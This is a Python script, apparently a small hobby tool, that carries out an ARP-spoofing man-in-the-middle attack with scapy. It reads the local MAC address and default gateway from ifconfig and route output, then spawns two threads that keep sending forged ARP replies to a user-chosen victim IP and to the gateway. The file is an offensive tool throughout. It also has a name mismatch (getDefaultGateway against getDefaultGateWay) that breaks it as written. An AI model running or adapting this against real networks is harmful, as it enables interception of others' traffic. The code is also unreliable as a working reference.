#!/usr/bin/env python

from scapy.all import *
from time import sleep
from sys import platform
import subprocess
import re
from threading import Thread
IPV4_LENGTH = 13
HW_LENGTH = 17
bcast_string = 'Bcast:'
hw_string = 'HWaddr '
class WorkerThread(Thread):
    def __init__(self, src_ip, src_hw, dst_ip):
        self.src_ip = src_ip
        self.src_hw = src_hw
        self.dst_ip = dst_ip
        Thread.__init__(self)
    def run(self):
        arp_packet = ARP()
        arp_packet.psrc = self.src_ip
        arp_packet.hwsrc = self.src_hw
        arp_packet.pdst = self.dst_ip
        try:
            i = 0
            while 1:
                print("Number of packets sent: "+str(i))
                send(arp_packet, verbose=0)
                i += 1
                sleep(1)
        except:
            print("Exception occured\n")
#IPV4_LENGTH = 13

#default_gateway =
def findBCastAddress():
    if platform.startswith('linux'):
        output = subprocess.Popen('ifconfig', stdout=subprocess.PIPE).communicate()[0]
        start_ip = output.index(bcast_string)
        bcast_ip_address = output[start_ip + len(bcast_string):start_ip + len(bcast_string) + IPV4_LENGTH]
        print('BroadCast Ip address is: '+bcast_ip_address)
        bcast_ip_address = bcast_ip_address.strip()
        return bcast_ip_address

def getDefaultGateWay():
	if platform.startswith('linux'):
		output = subprocess.Popen('route', stdout=subprocess.PIPE).communicate()[0]
		pattern = re.compile('default\s+')
		mat_object = pattern.search(output)
		index = output.index(mat_object.group(0))
		length = len(mat_object.group(0))
		default_gateway = output[index+length:index+length+IPV4_LENGTH]
		default_gateway = default_gateway.strip()
		print('Default gateway is: '+default_gateway)
		return default_gateway

def getCurrentMACAddress():
	if platform.startswith('linux'):
		output = subprocess.Popen(['ifconfig','-a'], stdout=subprocess.PIPE).communicate()[0]
		pattern = re.compile('HWaddr\s+')
		mat_object = pattern.search(output)
		index = output.index(mat_object.group(0))
		length = len(mat_object.group(0))
		currentMACAddress = output[index+length:index+length+HW_LENGTH]
		print('current Mac address is: '+currentMACAddress)
		return currentMACAddress

def man_in_the_middle():
	dst_ip = raw_input('Enter the machine IP you want to spoof: ')
	#src_ip = raw_input('Enter the default gateway IP: ')
	#src_hw = raw_input('Enter the source MAC address: ')
	current_mac_address = getCurrentMACAddress()
	default_gateway = getDefaultGateway()
	poison_client = WorkerThread(default_gateway, current_mac_address, dst_ip)
	poison_gateway = WorkerThread(dst_ip, current_mac_address, default_gateway)
	poison_client.start()
	poison_gateway.start()



if __name__=='__main__':
    man_in_the_middle()
